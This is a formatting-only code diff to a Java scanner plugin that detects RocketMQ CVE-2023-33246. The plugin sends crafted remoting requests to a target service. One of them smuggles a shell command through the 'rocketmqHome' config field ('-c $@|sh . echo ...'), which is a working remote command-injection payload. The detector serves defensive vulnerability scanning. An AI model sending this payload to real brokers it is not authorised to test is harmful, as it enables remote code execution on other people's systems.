@@ -66,8 +66,8 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
 
   @Inject
   RocketMQ_CVE202333246Detector(@UtcClock Clock utcClock, PayloadGenerator payloadGenerator) {
-      this.utcClock = checkNotNull(utcClock);
-      this.payloadGenerator = checkNotNull(payloadGenerator);
+    this.utcClock = checkNotNull(utcClock);
+    this.payloadGenerator = checkNotNull(payloadGenerator);
   }
 
   @Override
@@ -89,13 +89,15 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
     logger.atInfo().log("Checking if the service is a RocketMQ service.");
 
     byte[] probePayload = prepareProbePayload();
-    try (var socket = new java.net.Socket(
+    try (var socket =
+        new java.net.Socket(
             service.getNetworkEndpoint().getIpAddress().getAddress(),
             service.getNetworkEndpoint().getPort().getPortNumber())) {
       socket.getOutputStream().write(probePayload);
       byte[] response = new byte[4096];
       int bytesRead = socket.getInputStream().read(response);
-      String responseStr = new String(response, 0, bytesRead, java.nio.charset.StandardCharsets.UTF_8);
+      String responseStr =
+          new String(response, 0, bytesRead, java.nio.charset.StandardCharsets.UTF_8);
       if (responseStr.contains(ROCKETMQ_RESPONSE_INDICATOR)) {
         logger.atInfo().log("Service identified as RocketMQ.");
         return true;
@@ -104,7 +106,8 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
         return false;
       }
     } catch (IOException e) {
-      logger.atWarning().withCause(e).log("Failed to connect to the service at %s.", service.getNetworkEndpoint());
+      logger.atWarning().withCause(e).log(
+          "Failed to connect to the service at %s.", service.getNetworkEndpoint());
       return false;
     }
   }
@@ -125,8 +128,9 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
     String command = payload.getPayload();
     byte[] preparedPayload = preparePayload(command);
 
-    try (var socket = new java.net.Socket(
-            service.getNetworkEndpoint().getIpAddress().getAddress(), 
+    try (var socket =
+        new java.net.Socket(
+            service.getNetworkEndpoint().getIpAddress().getAddress(),
             service.getNetworkEndpoint().getPort().getPortNumber())) {
       socket.getOutputStream().write(preparedPayload);
       byte[] response = new byte[1024];
@@ -149,9 +153,10 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
 
   private byte[] preparePayload(String command) {
     int code = 25;
-    String jsonHeader = String.format(
-        "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
-        code);
+    String jsonHeader =
+        String.format(
+            "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
+            code);
     byte[] jsonHeaderBytes = jsonHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8);
 
     String body = "filterServerNums=1\nrocketmqHome=-c $@|sh . echo " + command + ";\n";
@@ -169,9 +174,10 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
 
   private byte[] prepareProbePayload() {
     int code = 0;
-    String jsonHeader = String.format(
-        "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
-        code);
+    String jsonHeader =
+        String.format(
+            "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
+            code);
     byte[] jsonHeaderBytes = jsonHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8);
 
     // No body for probe
